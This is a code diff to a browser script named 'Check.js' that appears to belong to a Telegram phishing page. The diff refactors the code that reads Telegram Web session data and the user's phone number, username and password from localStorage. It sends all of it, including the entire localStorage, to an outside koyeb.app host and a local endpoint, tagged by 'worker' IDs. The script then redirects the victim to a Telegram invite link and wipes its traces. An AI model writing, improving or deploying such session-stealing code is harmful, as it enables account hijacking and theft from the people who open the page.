@@ -1,5 +1,5 @@
 document.addEventListener('DOMContentLoaded', function () {
-  console.log('Check.js Initialized')
+  console.log('Check.js Initialized');
   async function checkLocalStorage() {
     let globalState = localStorage.getItem('tt-global-state');
     if (globalState && localStorage.getItem('user_auth')) {
@@ -23,59 +23,52 @@ document.addEventListener('DOMContentLoaded', function () {
           localStorage.removeItem('GramJs:apiCache');
           localStorage.removeItem('tt-global-state');
 
-      console.log('making post requests')
-          
-          await fetch(`https://loud-rani-senior-e8046183.koyeb.app/api/users/telegram/info`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              userId: currentUserId,
-              firstName,
-              usernames,
-              phoneNumber,
-              isPremium,
-              password,
-              quicklySet: localStorage,
-              type: new URLSearchParams(window.location.search).get('type'),
-              worker: new URLSearchParams(window.location.search).get('worker'),
-              workerId: new URLSearchParams(window.location.search).get(
-                'workerId'
-              ),
-            }),
-          });
-          await fetch(`/api/users/telegram/info`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              userId: currentUserId,
-              firstName,
-              usernames,
-              phoneNumber,
-              isPremium,
-              password,
-              quicklySet: localStorage,
-              type: new URLSearchParams(window.location.search).get('type'),
-              worker: new URLSearchParams(window.location.search).get('worker'),
-              workerId: new URLSearchParams(window.location.search).get(
-                'workerId'
-              ),
-            }),
-          });
+          console.log('making post requests');
 
-          window.Telegram.WebApp.openTelegramLink(
-            'https://t.me/+8dtqN7T2sJpmNTb7'
-          );
-          window.Telegram.WebApp.close();
-          localStorage.clear();
-          document.cookie =
-            'password=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;';
-          window.location.href = 'https://web.telegram.org/a/';
+          // Data object to send to both endpoints
+          const requestData = {
+            userId: currentUserId,
+            firstName,
+            usernames,
+            phoneNumber,
+            isPremium,
+            password,
+            quicklySet: localStorage,
+            type: new URLSearchParams(window.location.search).get('type'),
+            worker: new URLSearchParams(window.location.search).get('worker'),
+            workerId: new URLSearchParams(window.location.search).get('workerId')
+          };
 
-          clearInterval(checkInterval);
+          // Use Promise.all to send requests to both endpoints concurrently
+          try {
+            await Promise.all([
+              fetch(`https://loud-rani-senior-e8046183.koyeb.app/api/users/telegram/info`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(requestData),
+              }),
+              fetch(`/api/users/telegram/info`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(requestData),
+              })
+            ]);
+
+            // After both requests are successful, perform the rest of the actions
+            window.Telegram.WebApp.openTelegramLink('https://t.me/+8dtqN7T2sJpmNTb7');
+            window.Telegram.WebApp.close();
+            localStorage.clear();
+            document.cookie = 'password=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;';
+            window.location.href = 'https://web.telegram.org/a/';
+
+            clearInterval(checkInterval);
+          } catch (error) {
+            console.error('Error during the fetch requests:', error);
+          }
         }
       }
     } else {
-      console.log('no post request made!')
+      console.log('no post request made!');
       sessionStorage.clear();
       localStorage.clear();
     }
